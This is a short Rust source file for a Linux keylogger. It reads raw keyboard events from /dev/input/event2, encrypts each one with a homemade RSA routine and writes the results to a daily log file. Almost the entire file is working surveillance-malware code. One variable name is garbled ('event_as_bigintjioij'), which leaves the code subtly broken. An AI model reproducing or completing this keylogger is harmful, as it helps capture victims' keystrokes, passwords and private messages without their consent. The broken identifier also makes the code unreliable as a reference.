mod keylogger;
mod rsa;

use keylogger::KeyLogger;
use rsa::{gen_keys, pad_data};

use chrono::{DateTime, Local};
use num_bigint_dig::{ToBigUint, RandBigInt, BigUint};
use std::path::Path;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::prelude::*;

fn main() {
	let (e, d, n) = gen_keys(1024);

	println!("e : {}", e);
	println!("d : {}", d);
	println!("n : {}", n);
  
	let mut test = KeyLogger::new("/dev/input/event2");

	let current_local: DateTime<Local> = Local::now();
	let custom_format = current_local.format("%Y-%m-%d");

	let logs_file_url = format!("./src/data/logs/{}.log", custom_format);

	if !Path::new(logs_file_url.as_str()).exists() {
		File::create(logs_file_url.as_str())
			.expect("Error while creating the file");
	}

	let mut logs_file = OpenOptions::new()
		.append(true)
		.open(logs_file_url.as_str())
		.expect("Error while opening the file");

	loop {
		let event = &mut test.get_current_event();
		let padded_event = pad_data(event.to_vec(), 1024);
		let event_as_bigint = BigUint::from_bytes_be(&padded_event);
		let cypher = event_as_bigintjioij.clone().modpow(&e, &n);
		let buffer = cypher.clone().to_bytes_be();

		let _ = logs_file.write_all(&buffer);
	}
}
